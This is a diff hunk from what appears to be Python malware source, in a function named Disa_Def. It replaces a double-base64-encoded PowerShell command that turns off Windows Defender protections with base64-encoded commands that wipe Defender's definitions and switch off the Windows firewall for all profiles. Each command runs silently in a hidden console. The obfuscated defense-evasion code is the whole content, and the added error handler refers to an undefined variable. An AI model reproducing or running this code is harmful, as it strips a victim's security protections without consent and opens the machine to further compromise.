@@ -150,9 +150,14 @@ def self_delete():
         error_Handler(e)
 def Disa_Def():
     try:
-        cmd = b64decode(b'Y0c5M1pYSnphR1ZzYkNCVFpYUXRUWEJRY21WbVpYSmxibU5sSUMxRWFYTmhZbXhsU1c1MGNuVnphVzl1VUhKbGRtVnVkR2x2YmxONWMzUmxiU0FrZEhKMVpTQXRSR2x6WVdKc1pVbFBRVlpRY205MFpXTjBhVzl1SUNSMGNuVmxJQzFFYVhOaFlteGxVbVZoYkhScGJXVk5iMjVwZEc5eWFXNW5JQ1IwY25WbElDMUVhWE5oWW14bFUyTnlhWEIwVTJOaGJtNXBibWNnSkhSeWRXVWdMVVZ1WVdKc1pVTnZiblJ5YjJ4c1pXUkdiMnhrWlhKQlkyTmxjM01nUkdsellXSnNaV1FnTFVWdVlXSnNaVTVsZEhkdmNtdFFjbTkwWldOMGFXOXVJRUYxWkdsMFRXOWtaU0F0Um05eVkyVWdMVTFCVUZOU1pYQnZjblJwYm1jZ1JHbHpZV0pzWldRZ0xWTjFZbTFwZEZOaGJYQnNaWE5EYjI1elpXNTBJRTVsZG1WeVUyVnVaQ0FtSmlCd2IzZGxjbk5vWld4c0lGTmxkQzFOY0ZCeVpXWmxjbVZ1WTJVZ0xWTjFZbTFwZEZOaGJYQnNaWE5EYjI1elpXNTBJRElnSmlBaUpWQnliMmR5WVcxR2FXeGxjeVZjVjJsdVpHOTNjeUJFWldabGJtUmxjbHhOY0VOdFpGSjFiaTVsZUdVaUlDMVNaVzF2ZG1WRVpXWnBibWwwYVc5dWN5QXRRV3hz')
-        cmd = b64decode(cmd).decode()
-        subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+        cmd = b64decode(b'QzpcXFByb2dyYW0gRmlsZXNcXFdpbmRvd3MgRGVmZW5kZXJcXE1wQ21kUnVuLmV4ZSAtUmVtb3ZlRGVmaW5pdGlvbnMgLUFsbA==').decode()
+        subprocess.Popen(cmd, shell= True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+        try:
+            cmd = b64decode(b'cG93ZXJzaGVsbCAibmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9mZiIJ').decode() # NEED ADMIN RIGHTS
+            subprocess.Popen(cmd, shell= True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+        except:
+            error_Handler(e)
+            pass
     except Exception as e:
         error_Handler(e)
         pass
